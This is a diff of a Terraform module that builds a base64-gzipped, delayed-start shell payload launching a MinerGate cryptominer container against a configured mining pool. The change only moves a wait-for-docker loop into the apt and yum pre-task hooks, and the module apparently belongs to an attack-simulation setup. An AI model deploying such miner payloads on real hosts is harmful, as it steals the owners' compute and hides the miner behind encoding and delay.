@@ -24,12 +24,6 @@ locals {
         log "Waiting for package manager to be available..."
         sleep 10
     done
-    log "Checking for docker..."
-    while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
-        log "docker not found or not ready - waiting"
-        sleep 120
-    done
-    log "docker path: $(command -v  docker)"
     if [[ `sudo docker ps | grep ${local.minergate_name}` ]]; then docker stop ${local.minergate_name}; fi
     sudo docker run --rm -d --network=host --name ${local.minergate_name} ${local.minergate_image} -a cryptonight -o ${local.minergate_server} -u ${ local.minergate_user } -p x
     sudo docker ps -a >> $LOGFILE 2>&1
@@ -39,10 +33,24 @@ locals {
     base64_payload = base64gzip(templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
         script_name = var.inputs["tag"]
         log_rotation_count = 2
-        apt_pre_tasks = ""
+        apt_pre_tasks = <<-EOT
+        log "Checking for docker..."
+        while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
+            log "docker not found or not ready - waiting"
+            sleep 120
+        done
+        log "docker path: $(command -v  docker)"
+        EOT
         apt_packages = ""
         apt_post_tasks = ""
-        yum_pre_tasks =  ""
+        yum_pre_tasks =  <<-EOT
+        log "Checking for docker..."
+        while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
+            log "docker not found or not ready - waiting"
+            sleep 120
+        done
+        log "docker path: $(command -v  docker)"
+        EOT
         yum_packages = ""
         yum_post_tasks = ""
         script_delay_secs = 30
